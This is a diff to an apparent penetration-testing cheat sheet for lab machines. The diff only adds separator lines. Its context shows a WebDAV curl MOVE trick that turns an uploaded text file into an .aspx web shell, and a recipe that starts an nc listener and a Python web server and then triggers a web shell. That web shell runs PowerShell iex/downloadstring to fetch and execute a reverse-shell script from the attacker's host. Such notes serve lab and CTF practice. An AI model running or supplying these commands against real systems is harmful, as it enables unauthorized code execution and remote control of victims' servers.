@@ -18,6 +18,7 @@ If you can upload txt, try MOVE
 http://10.10.10.15/0xdf.txt - the file to move
 ```
 `curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt` 
+--------------------------------------------
 
 # Linux
 
@@ -90,7 +91,7 @@ Start python3 -m http.server 80 in that same directory
 Start nc -lnvp 443
 Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)
 ``` 
-
+--------------------------------------------
 ## PrivEsc
 [living off the land binaries lolbas](https://lolbas-project.github.io/)
 
